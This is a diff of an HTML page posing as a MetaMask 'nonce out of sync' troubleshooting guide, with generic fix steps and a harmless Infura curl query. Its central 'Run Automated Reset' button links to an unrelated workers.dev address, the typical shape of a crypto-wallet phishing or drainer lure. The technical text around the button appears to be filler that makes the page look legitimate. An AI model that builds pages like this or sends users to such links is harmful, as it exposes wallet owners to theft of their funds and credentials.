@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #121214;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
-        background: #00adb5;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,27 +41,30 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message stating "MetaMask nonce out of sync" when attempting to send a transaction or interact with a smart contract on the Ethereum (ETH) network.</li>
+<li>The user encounters a "nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum (ETH) network, indicating that the transaction nonce stored in MetaMask does not match the nonce expected by the Ethereum blockchain.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the expected transaction nonce in MetaMask and the actual nonce on the Ethereum blockchain. This can happen when a transaction is sent but not confirmed, causing the nonce to become desynchronized.</li>
+<li>This error occurs due to a mismatch between the transaction count (nonce) stored locally in MetaMask and the actual transaction count on the Ethereum blockchain. This discrepancy can arise from various factors, including interrupted transactions, failed transaction attempts, or manual nonce adjustments.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset MetaMask account: Try resetting the MetaMask account to resynchronize the nonce.</li>
-<li>Update transaction nonce: Manually update the transaction nonce to match the current nonce on the blockchain.</li>
-<li>Force transaction resend: Forcefully resend the transaction with the correct nonce using the following command:</li>
+<li>Reset the MetaMask account to resynchronize the nonce with the blockchain:</li>
+<li>Try resetting the account in MetaMask settings</li>
+<li>Manually adjust the nonce to match the expected value</li>
+<li>Use the following command in a terminal to check the current transaction count for an address:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="w"> </span><span class="s1">&#39;{&#39;</span>from<span class="s1">&#39;: &#39;</span>0x...<span class="s1">&#39;,&#39;</span>nonce<span class="s1">&#39;: &#39;</span>0x...<span class="s1">&#39;,&#39;</span>gasPrice<span class="s1">&#39;: &#39;</span>0x...<span class="s1">&#39;}&#39;</span>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span><span class="s1">&#39;https://mainnet.infura.io/v3/YOUR_PROJECT_ID&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_getTransactionCount&quot;,&quot;params&quot;:[&quot;0xYOUR_ADDRESS&quot;,&quot;latest&quot;],&quot;id&quot;:1}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and transaction management.</p>
+<p>Consider utilizing an external console for more complex debugging and nonce management. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>MetaMask installed and configured</li>
-<li>Ethereum network selected</li>
-<li>Sufficient ETH balance for transaction fees</li>
+<li>A MetaMask wallet installed and configured</li>
+<li>An Ethereum node provider like Infura for API access</li>
+<li>Basic understanding of Ethereum transaction nonces and their role in transaction processing</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
